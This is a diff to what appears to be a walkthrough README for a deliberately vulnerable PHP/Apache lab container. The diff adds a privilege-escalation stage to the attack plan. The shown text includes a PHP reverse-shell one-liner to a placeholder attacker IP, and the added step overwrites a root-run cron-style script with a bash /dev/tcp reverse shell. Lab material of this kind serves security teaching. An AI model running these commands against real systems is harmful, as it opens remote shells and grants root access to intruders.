@@ -13,6 +13,7 @@ to get the PHP 7.3 version and instilled apache2 on it.
 - Content Discovery
 - Authentication Bypass
 - Reverse Shell
+- Privileges escalation
 
 ## Plan of Engagement
 1. Port Scanning -> 80
@@ -39,4 +40,11 @@ Use Reverse Shell to gain a foothold in the system.
 Using a tool like `netcat` to host the reverse shell.
 ```sh
 php -r '$sock=fsockopen("<attacker_ip>",<attacker_port>);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+Once access to the server, the user should be `www-data` by Apache default.
+Observe the ongoing processors in the contianers. The file `/worker.sh` is executing a job as root every 5th second.
+The file `/home/job.sh` has write privileges.
+Inject or overwrite a reverser shell command to the job.sh file of bash to call a new instance of netcat:
+```sh
+echo "bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1" > /home/job.sh
 ```
